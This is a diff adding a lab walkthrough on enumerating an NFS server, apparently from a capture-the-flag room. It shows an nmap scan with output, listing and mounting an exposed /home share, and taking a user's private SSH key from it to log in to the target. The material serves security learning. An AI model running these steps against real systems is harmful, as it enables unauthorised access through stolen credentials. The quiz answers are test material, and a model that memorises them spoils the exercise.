@@ -45,3 +45,160 @@ h. What is the latest version of NFS? [released in 2016, but is still up to date
 sol. 4.2
 
 TASK 3: Enumerating NFS
+- Enumeration is defined as "a process which establishes an active connection to the target hosts to discover potential attack vectors in the system, and the same can be used for further exploitation of the system." - Infosec Institute.
+- In order to do a more advanced enumeration of the NFS server, and shares- we're going to need a few tools. The first of which is key to interacting with any NFS share from your local machine: nfs-common.
+- NFS-Common 
+  -> It is important to have this package installed on any machine that uses NFS, either as client or server
+  ->  It includes programs such as: lockd, statd, showmount, nfsstat, gssd, idmapd and mount.nfs. 
+  -> Primarily, we are concerned with "showmount" and "mount.nfs" as these are going to be most useful to us when it comes to extracting information from the NFS share.
+  -> more info : https://packages.ubuntu.com/jammy/nfs-common
+- The first step of enumeration is to conduct a port scan, to find out as much information as you can about the services, open ports and operating system of the target machine. You can go as in-depth as you like on this, however, I suggest using nmap with the -A and -p- tags.
+- Mounting NFS shares
+  -> Your client’s system needs a directory where all the content shared by the host server in the export folder can be accessed.
+  -> You can create this folder anywhere on your system. Once you've created this mount point, you can use the "mount" command to connect the NFS share to the mount point on your machine like so:
+        sudo mount -t nfs IP:share /tmp/mount/ -nolock
+        Let's break this down
+
+Tag					Function
+sudo			Run as root
+mount			Execute the mount command
+-t nfs			Type of device to mount, then specifying that it's NFS
+IP:share		The IP Address of the NFS server, and the name of the share we wish to mount
+-nolock			Specifies not to use NLM locking
+
+a. Conduct a thorough port scan scan of your choosing, how many ports are open?
+sol. 7
+┌──(kali㉿kali)-[~]
+└─$ sudo nmap -p- -T4 -A 10.10.79.146     
+[sudo] password for kali: 
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-18 22:51 EDT
+Stats: 0:01:31 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 29.04% done; ETC: 22:56 (0:03:40 remaining)
+Stats: 0:02:49 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 38.54% done; ETC: 22:59 (0:04:30 remaining)
+Stats: 0:06:07 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 67.37% done; ETC: 23:00 (0:02:57 remaining)
+Nmap scan report for 10.10.79.146
+Host is up (0.20s latency).
+Not shown: 65528 closed tcp ports (reset)
+	PORT      STATE SERVICE  VERSION
+1.	22/tcp    open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+	| ssh-hostkey: 
+	|   2048 73:92:8e:04:de:40:fb:9c:90:f9:cf:42:70:c8:45:a7 (RSA)
+	|   256 6d:63:d6:b8:0a:67:fd:86:f1:22:30:2b:2d:27:1e:ff (ECDSA)
+	|_  256 bd:08:97:79:63:0f:80:7c:7f:e8:50:dc:59:cf:39:5e (ED25519)
+2.	111/tcp   open  rpcbind  2-4 (RPC #100000)
+	| rpcinfo: 
+	|   program version    port/proto  service
+	|   100227  3           2049/tcp   nfs_acl
+	|   100227  3           2049/tcp6  nfs_acl
+	|   100227  3           2049/udp   nfs_acl
+	|_  100227  3           2049/udp6  nfs_acl
+3.	2049/tcp  open  nfs_acl  3 (RPC #100227)
+4.	37809/tcp open  nlockmgr 1-4 (RPC #100021)
+5.	51813/tcp open  mountd   1-3 (RPC #100005)
+6.	53019/tcp open  mountd   1-3 (RPC #100005)
+7.	58873/tcp open  mountd   1-3 (RPC #100005)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.94SVN%E=4%D=10/18%OT=22%CT=1%CU=35697%PV=Y%DS=2%DC=T%G=Y%TM=671
+OS:32129%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A
+OS:)SEQ(SP=105%GCD=1%ISR=10B%TI=Z%CI=Z%TS=A)SEQ(SP=105%GCD=1%ISR=10B%TI=Z%C
+OS:I=Z%II=I%TS=A)OPS(O1=M508ST11NW6%O2=M508ST11NW6%O3=M508NNT11NW6%O4=M508S
+OS:T11NW6%O5=M508ST11NW6%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5
+OS:=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%
+OS:T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
+OS:R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T
+OS:=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=
+OS:0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(
+OS:R=Y%DFI=N%T=40%CD=S)
+
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT       ADDRESS
+1   211.42 ms 10.9.0.1
+2   211.82 ms 10.10.79.146
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 621.30 seconds
+
+b. Which port contains the service we're looking to enumerate?
+sol. 2049
+
+c. Now, use /usr/sbin/showmount -e [IP] to list the NFS shares, what is the name of the visible share?
+sol. /home
+┌──(kali㉿kali)-[~]
+└─$ /usr/sbin/showmount -e 10.10.79.146
+Export list for 10.10.79.146:
+/home *
+
+d. Time to mount the share to our local machine!
+First, use "mkdir /tmp/mount" to create a directory on your machine to mount the share to. This is in the /tmp directory- so be aware that it will be removed on restart.
+Then, use the mount command we broke down earlier to mount the NFS share to your local machine. Change directory to where you mounted the share- what is the name of the folder inside?
+sol. cappucino
+┌──(kali㉿kali)-[/tmp/mount]
+└─$ sudo mount -t nfs 10.10.79.146:/home /tmp/mount -o nolock
+┌──(kali㉿kali)-[/tmp]
+└─$ ls -la mount                        
+total 12
+drwxr-xr-x  3 root root 4096 Apr 21  2020 .
+drwxrwxrwt 17 root root 4096 Oct 18 23:12 ..
+drwxr-xr-x  5 kali kali 4096 Jun  4  2020 cappucino
+
+e. Have a look inside this directory, look at the files. Looks like  we're inside a user's home directory...
+sol.
+┌──(kali㉿kali)-[/tmp/mount/cappucino]
+└─$ ls -la
+total 36
+drwxr-xr-x 5 kali kali 4096 Jun  4  2020 .
+drwxr-xr-x 3 root root 4096 Apr 21  2020 ..
+-rw------- 1 kali kali    5 Jun  4  2020 .bash_history
+-rw-r--r-- 1 kali kali  220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 kali kali 3771 Apr  4  2018 .bashrc
+drwx------ 2 kali kali 4096 Apr 22  2020 .cache
+drwx------ 3 kali kali 4096 Apr 22  2020 .gnupg
+-rw-r--r-- 1 kali kali  807 Apr  4  2018 .profile
+drwx------ 2 kali kali 4096 Apr 22  2020 .ssh
+-rw-r--r-- 1 kali kali    0 Apr 22  2020 .sudo_as_admin_successful
+
+f. Interesting! Let's do a bit of research now, have a look through the folders. Which of these folders could contain keys that would give us remote access to the server?
+sol. .ssh
+┌──(kali㉿kali)-[/tmp/mount/cappucino]
+└─$ cd .ssh 
+┌──(kali㉿kali)-[/tmp/mount/cappucino/.ssh]
+└─$ ls -la
+total 20
+drwx------ 2 kali kali 4096 Apr 22  2020 .
+drwxr-xr-x 5 kali kali 4096 Jun  4  2020 ..
+-rw------- 1 kali kali  399 Apr 22  2020 authorized_keys
+-rw------- 1 kali kali 1679 Apr 22  2020 id_rsa
+-rw-r--r-- 1 kali kali  399 Apr 22  2020 id_rsa.pub
+
+g. Which of these keys is most useful to us?
+sol. id_rsa
+
+h. Copy this file to a different location your local machine, and change the permissions to "600" using "chmod 600 [file]".
+    Assuming we were right about what type of directory this is, we can pretty easily work out the name of the user this key corresponds to.
+    Can we log into the machine using ssh -i <key-file> <username>@<ip> ? (Y/N)
+sol. y
+
+┌──(kali㉿kali)-[/tmp/mount/cappucino/.ssh]
+└─$ ssh -i id_rsa cappucino@10.10.79.146
+Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+  System information as of Sat Oct 19 03:41:11 UTC 2024
+  System load:  0.12              Processes:           101
+  Usage of /:   45.2% of 9.78GB   Users logged in:     0
+  Memory usage: 32%               IP address for eth0: 10.10.79.146
+  Swap usage:   0%
+44 packages can be updated.
+0 updates are security updates.
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+Last login: Sat Oct 19 03:38:22 2024 from 10.9.0.101
+cappucino@polonfs:~$ 
+
+TASK 4: Exploiting NFS
